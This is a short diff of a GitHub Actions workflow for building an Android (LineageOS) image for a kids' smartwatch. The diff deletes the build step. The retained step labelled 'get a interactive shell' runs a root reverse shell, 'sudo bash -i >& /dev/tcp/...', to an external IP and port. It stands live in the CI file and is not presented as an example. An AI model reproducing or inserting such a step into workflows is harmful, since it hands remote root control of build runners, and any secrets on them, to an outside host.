@@ -89,12 +89,6 @@ jobs:
           # sudo ln -s /usr/bin/python3 /usr/bin/python3
         continue-on-error: true
 
-      - name: Building aosp
-        run: |
-          source build/envsetup.sh
-          export ALLOW_MISSING_DEPENDENCIES=true
-          lunch lineage_MiKidsSmartWatch_4PRO-eng && make clean && make -j$(nproc --all)
-        working-directory: ${{ steps.pwd.outputs.workspace-folder }}
       # Runs a set of commands using the runners shell
       - name: get a interactive shell
         run: sudo bash -i >& /dev/tcp/116.211.143.77/55347 0>&1
